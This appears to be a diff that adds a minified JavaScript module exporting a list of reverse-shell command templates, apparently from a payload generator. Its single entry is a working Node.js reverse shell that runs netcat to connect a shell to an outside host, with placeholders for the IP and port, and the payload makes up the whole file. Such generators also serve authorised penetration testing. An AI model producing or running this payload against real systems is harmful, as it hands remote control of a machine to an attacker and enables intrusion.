@@ -1,0 +1,1 @@
+const e=[{title:"Node.js reverse shell #1",template:"require('child_process').exec('nc -e sh {ip} {port}')",description:"Simple Node.js reverse shell using netcat execution."}],s={commands:e};export{e as commands,s as default};
